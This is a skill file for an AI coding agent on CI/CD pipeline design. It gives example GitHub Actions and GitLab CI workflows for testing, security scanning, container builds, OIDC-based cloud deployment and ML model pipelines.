---
name: loom-ci-cd
description: Designs and implements CI/CD pipelines for automated testing, building, deployment, and security scanning across GitHub Actions, GitLab CI, Jenkins, CircleCI, and cloud-native platforms. Covers pipeline optimization, test integration, artifact management, and release automation.
allowed-tools:
  - Read
  - Grep
  - Glob
  - Edit
  - Write
  - Bash
triggers:
  - CI/CD
  - pipeline
  - workflow
  - GitHub Actions
  - GitLab CI
  - Jenkins
  - CircleCI
  - Travis CI
  - Azure Pipelines
  - build
  - deploy
  - deployment
  - release
  - artifact
  - stage
  - job
  - runner
  - action
  - automation
  - continuous integration
  - continuous deployment
  - continuous delivery
  - container registry
  - docker build
  - image push
  - canary deployment
  - blue-green deployment
  - rolling update
  - rollback
  - integration tests
  - smoke tests
  - security scanning
  - SAST
  - DAST
  - dependency scanning
  - secrets management
  - cache optimization
  - parallelization
  - monorepo CI
  - matrix build
  - self-hosted runner
  - ML pipeline
  - model training pipeline
  - model deployment
---

# CI/CD

## Overview

This skill covers the complete lifecycle of CI/CD pipeline design, implementation, and optimization across platforms including GitHub Actions, GitLab CI, Jenkins, CircleCI, and cloud-native solutions. It encompasses automated testing integration, security scanning, artifact management, deployment strategies, and specialized pipelines for ML workloads.

## When to Use

- Implementing or migrating CI/CD pipelines
- Optimizing build and test execution times
- Integrating security scanning (SAST, DAST, dependency checks)
- Setting up deployment automation with rollback strategies
- Configuring test suites in CI environments
- Managing artifacts and container registries
- Implementing ML model training and deployment pipelines
- Troubleshooting pipeline failures and flakiness

## Instructions

### 1. Analyze Requirements

- Identify build and test requirements
- Determine deployment targets and environments
- Assess security scanning needs (SAST, DAST, secrets, dependencies)
- Plan environment promotion strategy (dev → staging → production)
- Define quality gates and approval workflows
- Identify test suite composition (unit, integration, E2E)
- Determine artifact storage and retention policies

### 2. Design Pipeline Architecture

- Structure stages logically with clear dependencies
- Optimize for speed through parallelization and caching
- Design fail-fast strategy (lint → unit tests → integration tests → build)
- Plan secret management and secure credential handling
- Define deployment strategies (rolling, blue-green, canary)
- Architect for rollback and recovery procedures
- Design matrix builds for multi-platform support
- Plan monorepo CI strategies if applicable

### 3. Implement Testing Integration

- Configure unit test execution with coverage reporting
- Set up integration tests with service dependencies (databases, APIs)
- Implement E2E/smoke tests for critical user journeys
- Configure test parallelization and sharding
- Integrate test result reporting (JUnit, TAP, JSON)
- Set up flaky test detection and quarantine
- Configure performance/load testing stages
- Implement visual regression testing if applicable

### 4. Implement Security Scanning

- Integrate SAST (static analysis) tools (SonarQube, CodeQL, Semgrep)
- Configure DAST (dynamic analysis) for deployed environments
- Set up dependency/vulnerability scanning (Dependabot, Snyk, Trivy)
- Implement container image scanning
- Configure secrets detection (GitGuardian, TruffleHog)
- Set up license compliance checking
- Define security gate thresholds and failure policies

### 5. Implement Build and Artifact Management

- Configure dependency caching strategies
- Implement build output caching and layer caching (Docker)
- Set up artifact versioning and tagging
- Configure container registry integration
- Implement multi-stage builds for optimization
- Set up artifact signing and attestation
- Configure artifact retention and cleanup policies

### 6. Implement Deployment Automation

- Configure environment-specific deployments
- Implement deployment strategies (rolling, blue-green, canary)
- Set up health checks and readiness probes
- Configure smoke tests post-deployment
- Implement automated rollback on failure
- Set up deployment notifications (Slack, email, PagerDuty)
- Configure manual approval gates for production

### 7. Optimize Pipeline Performance

- Analyze pipeline execution times and bottlenecks
- Implement job parallelization for independent tasks
- Configure aggressive caching (dependencies, build outputs, Docker layers)
- Optimize test execution (parallel runners, test sharding)
- Use matrix builds efficiently
- Consider self-hosted runners for performance-critical workloads
- Implement conditional job execution (path filters, change detection)

### 8. Ensure Reliability and Observability

- Add retry logic for transient failures
- Implement comprehensive error handling
- Configure alerts for pipeline failures
- Set up metrics and dashboards for pipeline health
- Document runbooks and troubleshooting procedures
- Implement audit logging for deployments
- Configure SLO tracking for pipeline performance

## Best Practices

### Core Principles

1. **Fail Fast**: Run cheap, fast checks first (lint, type check, unit tests)
2. **Parallelize Aggressively**: Run independent jobs concurrently
3. **Cache Everything**: Dependencies, build outputs, Docker layers
4. **Secure by Default**: Secrets in vaults, least privilege, audit logs
5. **Environment Parity**: Keep dev/staging/prod as similar as possible
6. **Immutable Artifacts**: Build once, promote everywhere
7. **Automated Rollback**: Every deployment must be reversible
8. **Idempotent Operations**: Pipelines should be safely re-runnable

### Testing in CI/CD

1. **Test Pyramid**: More unit tests, fewer integration tests, minimal E2E
2. **Isolation**: Tests should not depend on execution order
3. **Determinism**: Eliminate flaky tests or quarantine them
4. **Fast Feedback**: Unit tests < 5min, full suite < 15min target
5. **Coverage Gates**: Enforce minimum coverage thresholds
6. **Service Mocking**: Use test doubles for external dependencies

### Security

1. **Shift Left**: Run security scans early in the pipeline
2. **Dependency Scanning**: Check for CVEs in all dependencies
3. **Secrets Management**: Never hardcode secrets, use secure vaults
4. **Least Privilege**: In GitHub Actions set `permissions: {}` at workflow level to deny all GITHUB_TOKEN scopes, then grant only what each job needs (`packages: write` for build/push, `security-events: write` for CodeQL, `id-token: write` + `attestations: write` for attestation). Setting any one scope forces all others to `none`. The GITHUB_TOKEN default is read-only only for orgs/repos created after Feb 2023 — older repos keep the permissive read-write default, so an absent block is dangerous. For cloud access, use OIDC federation, not stored long-lived credentials.
5. **Pin Actions to SHAs**: Reference third-party actions by full 40-char commit SHA (`uses: owner/action@<sha>  # vX.Y.Z`), never a mutable tag or `@main`/`@master`. Automate updates with Dependabot/Renovate (`package-ecosystem: github-actions`).
6. **Supply Chain Security**: Verify and sign artifacts; generate SLSA provenance/SBOM attestations and promote artifacts by immutable digest.
7. **Audit Trail**: Log all deployments and access

### Performance

1. **Incremental Builds**: Only rebuild changed components
2. **Layer Caching**: Optimize Dockerfile layer order
3. **Dependency Locking**: Pin versions for reproducibility
4. **Resource Limits**: Prevent resource exhaustion
5. **Path Filtering**: Skip jobs when irrelevant files change

## Examples

### Example 1: GitHub Actions Workflow

```yaml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  NODE_VERSION: "20"
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

  test:
    runs-on: ubuntu-latest
    needs: lint
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test -- --coverage
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test

      - name: Upload coverage
        uses: codecov/codecov-action@<full-sha>  # v5 — pin to SHA
        with:
          token: ${{ secrets.CODECOV_TOKEN }}  # required for non-fork uploads since v4
          files: ./coverage/lcov.info

  build:
    runs-on: ubuntu-latest
    needs: test
    permissions:
      contents: read
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=sha,prefix=
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      - name: Build and push
        id: build
        uses: docker/build-push-action@<full-sha>  # v6 — pin to SHA
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          provenance: mode=max  # SLSA provenance (private repos default to mode=min)
          sbom: true            # not automatic — opt in (incompatible with load: true)
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/develop'
    environment: staging

    steps:
      - uses: actions/checkout@v4

      - name: Deploy to staging
        uses: azure/k8s-deploy@v4
        with:
          namespace: staging
          manifests: |
            k8s/deployment.yaml
            k8s/service.yaml
          images: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}

  deploy-production:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: Deploy to production
        uses: azure/k8s-deploy@v4
        with:
          namespace: production
          manifests: |
            k8s/deployment.yaml
            k8s/service.yaml
          images: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          strategy: canary
          percentage: 20
```

### Example 2: GitLab CI Pipeline

```yaml
stages:
  - validate
  - test
  - build
  - deploy

variables:
  DOCKER_TLS_CERTDIR: "/certs"
  IMAGE_TAG: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

.node-base:
  image: node:20-alpine
  cache:
    key: ${CI_COMMIT_REF_SLUG}
    paths:
      - node_modules/

lint:
  stage: validate
  extends: .node-base
  script:
    - npm ci
    - npm run lint
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == "main"

test:
  stage: test
  extends: .node-base
  services:
    - postgres:16
  variables:
    POSTGRES_DB: test
    POSTGRES_USER: runner
    POSTGRES_PASSWORD: runner
    DATABASE_URL: postgresql://runner:runner@postgres:5432/test
  script:
    - npm ci
    - npm test -- --coverage
  coverage: '/Lines\s*:\s*(\d+\.?\d*)%/'
  artifacts:
    reports:
      coverage_report:
        coverage_format: cobertura
        path: coverage/cobertura-coverage.xml
      junit: junit.xml

build:
  stage: build
  image: docker:24
  services:
    - docker:24-dind
  script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
    - docker build -t $IMAGE_TAG .
    - docker push $IMAGE_TAG
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
    - if: $CI_COMMIT_BRANCH == "develop"

deploy-staging:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - kubectl set image deployment/app app=$IMAGE_TAG -n staging
    - kubectl rollout status deployment/app -n staging --timeout=300s
  environment:
    name: staging
    url: https://staging.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == "develop"

deploy-production:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - kubectl set image deployment/app app=$IMAGE_TAG -n production
    - kubectl rollout status deployment/app -n production --timeout=300s
  environment:
    name: production
    url: https://example.com
  when: manual
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
```

### Example 3: Reusable Workflow (GitHub Actions)

```yaml
# .github/workflows/reusable-deploy.yml
name: Reusable Deploy Workflow

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      image-tag:
        required: true
        type: string
      cluster-name:
        required: true
        type: string
      aws-region:
        required: true
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    permissions:
      id-token: write  # REQUIRED for OIDC federation
      contents: read

    steps:
      - uses: actions/checkout@<full-sha>  # v4 — pin to SHA

      - name: Set up kubectl
        uses: azure/setup-kubectl@<full-sha>  # v4 — pin to SHA

      # Prefer OIDC over a long-lived base64 KUBE_CONFIG secret: mint short-lived
      # cloud creds, then derive a kubeconfig. (GCP: gcloud + gke-gcloud-auth-plugin;
      # Azure: az aks get-credentials.)
      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@<full-sha>  # v4 — pin to SHA
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: ${{ inputs.aws-region }}

      - name: Update kubeconfig (short-lived cluster creds)
        run: aws eks update-kubeconfig --name ${{ inputs.cluster-name }} --region ${{ inputs.aws-region }}

      - name: Deploy
        run: |
          kubectl set image deployment/app \
            app=${{ inputs.image-tag }} \
            -n ${{ inputs.environment }}

          kubectl rollout status deployment/app \
            -n ${{ inputs.environment }} \
            --timeout=300s

      - name: Verify deployment
        run: |
          kubectl get pods -n ${{ inputs.environment }} -l app=app
          kubectl logs -n ${{ inputs.environment }} -l app=app --tail=50
```

### Example 4: Security Scanning Pipeline

```yaml
name: Security Scanning

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 0 * * 0" # Weekly scan

jobs:
  sast:
    name: Static Analysis (SAST)
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: javascript, python

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3

      - name: SonarQube Scan
        # sonarcloud-github-action is deprecated (repo archived 2025-10-22);
        # sonarqube-scan-action is the drop-in replacement. Pin to a full SHA.
        uses: SonarSource/sonarqube-scan-action@<full-sha>  # vX.Y.Z
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: >
            -Dsonar.organization=myorg
            -Dsonar.projectKey=myproject
            -Dsonar.qualitygate.wait=true

  dependency-scan:
    name: Dependency Vulnerability Scan
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@<full-sha>  # v0.24.0 — pin to SHA, never @master
        with:
          scan-type: "fs"
          scan-ref: "."
          format: "sarif"
          output: "trivy-results.sarif"
          severity: "CRITICAL,HIGH"

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: "trivy-results.sarif"

      - name: Snyk Security Scan
        uses: snyk/actions/node@<full-sha>  # vX.Y.Z — pin to SHA, never @master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  secrets-scan:
    name: Secrets Detection
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # Full history for secret detection

      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@<full-sha>  # vX.Y.Z — pin to SHA, never @main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

      - name: GitGuardian Scan
        uses: GitGuardian/ggshield-action@<full-sha>  # v1.x — pin to SHA, tags are mutable
        env:
          GITHUB_PUSH_BEFORE_SHA: ${{ github.event.before }}
          GITHUB_PUSH_BASE_SHA: ${{ github.event.base }}
          GITHUB_DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
          GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}

  container-scan:
    name: Container Image Scan
    runs-on: ubuntu-latest
    needs: [sast, dependency-scan]

    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Scan image with Trivy
        uses: aquasecurity/trivy-action@<full-sha>  # v0.24.0 — pin to SHA, never @master
        with:
          image-ref: "myapp:${{ github.sha }}"
          format: "sarif"
          output: "trivy-image-results.sarif"

      - name: Scan image with Grype
        uses: anchore/scan-action@<full-sha>  # vX.Y.Z — pin to SHA
        with:
          image: "myapp:${{ github.sha }}"
          fail-build: true
          severity-cutoff: high
```

### Example 5: Test Integration with Parallelization

```yaml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    name: Unit Tests
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20, 22]
        os: [ubuntu-latest, macos-latest, windows-latest]

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Run unit tests
        run: npm run test:unit -- --coverage --maxWorkers=4

      - name: Upload coverage
        uses: codecov/codecov-action@<full-sha>  # v5 — pin to SHA
        with:
          token: ${{ secrets.CODECOV_TOKEN }}  # required for non-fork uploads since v4
          files: ./coverage/coverage-final.json
          flags: unit-${{ matrix.os }}-node${{ matrix.node-version }}

  integration-tests:
    name: Integration Tests
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2, 3, 4]

    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Run integration tests (shard ${{ matrix.shard }}/4)
        run: npm run test:integration -- --shard=${{ matrix.shard }}/4
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
          REDIS_URL: redis://localhost:6379

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: integration-test-results-${{ matrix.shard }}
          path: test-results/

  e2e-tests:
    name: E2E Tests
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"

      - name: Install dependencies
        run: npm ci

      - name: Install Playwright
        run: npx playwright install --with-deps

      - name: Build application
        run: npm run build

      - name: Run E2E tests
        run: npm run test:e2e

      - name: Upload Playwright report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-report
          path: playwright-report/

  test-report:
    name: Generate Test Report
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, e2e-tests]
    if: always()

    steps:
      - uses: actions/checkout@v4

      - name: Download all test results
        uses: actions/download-artifact@v4
        with:
          path: test-results/

      - name: Generate combined report
        run: |
          npm install -g junit-viewer
          junit-viewer --results=test-results/ --save=test-report.html

      - name: Upload combined report
        uses: actions/upload-artifact@v4
        with:
          name: combined-test-report
          path: test-report.html
```

### Example 6: ML Pipeline (Model Training & Deployment)

```yaml
name: ML Pipeline

on:
  push:
    branches: [main]
    paths:
      - "models/**"
      - "training/**"
      - "data/**"
  workflow_dispatch:
    inputs:
      model-version:
        description: "Model version to train"
        required: true
        type: string

jobs:
  data-validation:
    name: Validate Training Data
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install dependencies
        run: |
          pip install pandas great-expectations dvc

      - name: Pull data with DVC
        run: |
          dvc remote modify origin --local auth basic
          dvc remote modify origin --local user ${{ secrets.DVC_USER }}
          dvc remote modify origin --local password ${{ secrets.DVC_PASSWORD }}
          dvc pull

      - name: Validate data schema
        run: python scripts/validate_data.py

      - name: Run Great Expectations
        run: great_expectations checkpoint run training_data_checkpoint

  train-model:
    name: Train ML Model
    runs-on: ubuntu-latest
    needs: data-validation

    steps:
      - uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install mlflow wandb

      - name: Configure MLflow
        run: |
          echo "MLFLOW_TRACKING_URI=${{ secrets.MLFLOW_TRACKING_URI }}" >> $GITHUB_ENV
          echo "MLFLOW_TRACKING_USERNAME=${{ secrets.MLFLOW_USERNAME }}" >> $GITHUB_ENV
          echo "MLFLOW_TRACKING_PASSWORD=${{ secrets.MLFLOW_PASSWORD }}" >> $GITHUB_ENV

      - name: Train model
        run: |
          python training/train.py \
            --experiment-name "prod-training" \
            --model-version ${{ inputs.model-version || github.sha }} \
            --config training/config.yaml
        env:
          WANDB_API_KEY: ${{ secrets.WANDB_API_KEY }}

      - name: Upload model artifact
        uses: actions/upload-artifact@v4
        with:
          name: trained-model
          path: models/output/

  evaluate-model:
    name: Evaluate Model Performance
    runs-on: ubuntu-latest
    needs: train-model

    steps:
      - uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Download model
        uses: actions/download-artifact@v4
        with:
          name: trained-model
          path: models/output/

      - name: Run model evaluation
        run: python evaluation/evaluate.py --model-path models/output/

      - name: Check performance thresholds
        run: |
          python evaluation/check_metrics.py \
            --min-accuracy 0.85 \
            --min-f1 0.80

      - name: Generate model card
        run: python scripts/generate_model_card.py

  deploy-model:
    name: Deploy Model to Production
    runs-on: ubuntu-latest
    needs: evaluate-model
    if: github.ref == 'refs/heads/main'
    environment: production
    permissions:
      id-token: write  # REQUIRED for OIDC — omitting silently breaks the token request
      contents: read

    steps:
      - uses: actions/checkout@<full-sha>  # v4 — pin to SHA

      - name: Download model
        uses: actions/download-artifact@<full-sha>  # v4 — pin to SHA
        with:
          name: trained-model
          path: models/output/

      - name: Configure AWS credentials (OIDC, no stored keys)
        uses: aws-actions/configure-aws-credentials@<full-sha>  # v4 — pin to SHA
        with:
          # Short-lived STS creds via OIDC — no long-lived access keys as secrets.
          # Trust policy: StringEquals sub = repo:org/repo:environment:production
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-ml-deploy
          aws-region: us-east-1

      - name: Upload model to S3
        run: |
          aws s3 cp models/output/model.pkl \
            s3://my-ml-models/prod/${{ github.sha }}/model.pkl

      - name: Deploy to SageMaker
        run: |
          python deployment/deploy_sagemaker.py \
            --model-uri s3://my-ml-models/prod/${{ github.sha }}/model.pkl \
            --endpoint-name prod-ml-endpoint \
            --instance-type ml.m5.large

      - name: Run smoke tests
        run: python deployment/smoke_test.py --endpoint prod-ml-endpoint

      - name: Update model registry
        run: |
          python scripts/register_model.py \
            --version ${{ github.sha }} \
            --stage production \
            --metadata models/output/metadata.json
```

### Example 7: Monorepo CI with Path Filtering

```yaml
name: Monorepo CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  detect-changes:
    name: Detect Changed Services
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      worker: ${{ steps.filter.outputs.worker }}
      shared: ${{ steps.filter.outputs.shared }}

    steps:
      - uses: actions/checkout@v4

      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'services/api/**'
              - 'packages/shared/**'
            web:
              - 'services/web/**'
              - 'packages/shared/**'
            worker:
              - 'services/worker/**'
              - 'packages/shared/**'
            shared:
              - 'packages/shared/**'

  test-api:
    name: Test API Service
    needs: detect-changes
    if: needs.detect-changes.outputs.api == 'true'
    runs-on: ubuntu-latest

    defaults:
      run:
        working-directory: services/api

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"
          cache-dependency-path: services/api/package-lock.json

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

  test-web:
    name: Test Web Service
    needs: detect-changes
    if: needs.detect-changes.outputs.web == 'true'
    runs-on: ubuntu-latest

    defaults:
      run:
        working-directory: services/web

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"
          cache-dependency-path: services/web/package-lock.json

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build

  test-worker:
    name: Test Worker Service
    needs: detect-changes
    if: needs.detect-changes.outputs.worker == 'true'
    runs-on: ubuntu-latest

    defaults:
      run:
        working-directory: services/worker

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"
          cache-dependency-path: services/worker/package-lock.json

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

  build-and-deploy:
    name: Build and Deploy Changed Services
    needs: [detect-changes, test-api, test-web, test-worker]
    if: |
      always() &&
      (needs.test-api.result == 'success' || needs.test-api.result == 'skipped') &&
      (needs.test-web.result == 'success' || needs.test-web.result == 'skipped') &&
      (needs.test-worker.result == 'success' || needs.test-worker.result == 'skipped')
    runs-on: ubuntu-latest
    strategy:
      matrix:
        service:
          - name: api
            changed: ${{ needs.detect-changes.outputs.api == 'true' }}
          - name: web
            changed: ${{ needs.detect-changes.outputs.web == 'true' }}
          - name: worker
            changed: ${{ needs.detect-changes.outputs.worker == 'true' }}

    steps:
      - uses: actions/checkout@v4
        if: matrix.service.changed == 'true'

      - name: Build and push ${{ matrix.service.name }}
        if: matrix.service.changed == 'true'
        run: |
          docker build -t myapp-${{ matrix.service.name }}:${{ github.sha }} \
            services/${{ matrix.service.name }}
          docker push myapp-${{ matrix.service.name }}:${{ github.sha }}
```

### Example 8: Performance Optimization Pipeline

```yaml
name: Optimized CI Pipeline

on: [push, pull_request]

jobs:
  # Fast feedback jobs run first
  quick-checks:
    name: Quick Checks (< 2min)
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"

      - name: Cache node_modules
        uses: actions/cache@v4
        with:
          path: node_modules
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-node-

      - name: Install dependencies
        run: npm ci --prefer-offline --no-audit

      - name: Parallel lint and type check
        run: |
          npm run lint &
          npm run type-check &
          wait

  unit-tests-fast:
    name: Unit Tests (Changed Files Only)
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # Need full history for changed files

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"

      - name: Install dependencies
        run: npm ci --prefer-offline

      - name: Get changed files
        id: changed-files
        run: |
          echo "files=$(git diff --name-only origin/main...HEAD | \
            grep -E '\.(ts|tsx|js|jsx)$' | \
            xargs -I {} echo '--findRelatedTests {}' | \
            tr '\n' ' ')" >> $GITHUB_OUTPUT

      - name: Run tests for changed files only
        if: steps.changed-files.outputs.files != ''
        run: npm test -- ${{ steps.changed-files.outputs.files }}

  build-with-cache:
    name: Build with Aggressive Caching
    runs-on: ubuntu-latest
    needs: quick-checks

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: "npm"

      - name: Cache build output
        uses: actions/cache@v4
        with:
          path: |
            .next/cache
            dist/
            build/
          key: ${{ runner.os }}-build-${{ hashFiles('**/*.ts', '**/*.tsx', '**/*.js') }}
          restore-keys: |
            ${{ runner.os }}-build-

      - name: Install dependencies
        run: npm ci --prefer-offline

      - name: Build
        run: npm run build

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7

  docker-build-optimized:
    name: Docker Build with Layer Caching
    runs-on: ubuntu-latest
    needs: quick-checks

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build with cache
        uses: docker/build-push-action@<full-sha>  # v6 — pin to SHA
        with:
          context: .
          push: false
          tags: myapp:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          # NOTE: do NOT add BUILDKIT_INLINE_CACHE=1 here — that build-arg drives the
          # REGISTRY inline-cache mechanism and is silently ignored by the type=gha backend.
```

## Pipeline Optimization Patterns

### Caching Strategy

1. **Dependency Caching**: Cache `node_modules`, `vendor/`, `.m2/`, etc.
2. **Build Output Caching**: Cache compiled artifacts between runs
3. **Docker Layer Caching**: Use BuildKit cache mounts and GitHub Actions cache
4. **Incremental Builds**: Only rebuild changed modules (Nx, Turborepo)

### Parallelization Strategies

1. **Job-Level Parallelization**: Run independent jobs concurrently
2. **Test Sharding**: Split test suite across multiple runners
3. **Matrix Builds**: Test multiple versions/platforms simultaneously
4. **Monorepo Path Filtering**: Only test changed services

### Conditional Execution

1. **Path Filters**: Skip jobs when irrelevant files change
2. **Changed Files Detection**: Test only affected code
3. **Branch-Specific Jobs**: Different pipelines for different branches
4. **Manual Triggers**: Allow on-demand pipeline execution

## ML-Specific Patterns

### Model Training Pipeline

1. **Data Validation**: Validate schema and quality before training
2. **Experiment Tracking**: Log metrics to MLflow/W&B
3. **Model Versioning**: Tag models with git SHA or semantic version
4. **Performance Gates**: Enforce minimum accuracy/F1 thresholds

### Model Deployment

1. **A/B Testing**: Deploy new model alongside existing
2. **Shadow Mode**: Run new model without affecting production
3. **Canary Rollout**: Gradually increase traffic to new model
4. **Automated Rollback**: Revert on performance degradation

## Troubleshooting Guide

### Common Issues

1. **Flaky Tests**: Implement retry logic, increase timeouts, fix race conditions
2. **Slow Pipelines**: Profile execution times, add caching, parallelize
3. **Secrets Exposure**: Use secret scanning, audit logs, rotate credentials
4. **Resource Exhaustion**: Set resource limits, use cleanup actions
5. **Network Timeouts**: Add retries, use artifact caching, increase timeouts

### Debugging Commands

```bash
# GitHub Actions local testing
act -j test --secret-file .env.secrets

# GitLab CI local testing
gitlab-runner exec docker test

# Jenkins pipeline validation
java -jar jenkins-cli.jar declarative-linter < Jenkinsfile

# Docker build debugging
DOCKER_BUILDKIT=1 docker build --progress=plain .

# Test pipeline with dry-run
kubectl apply --dry-run=client -f k8s/

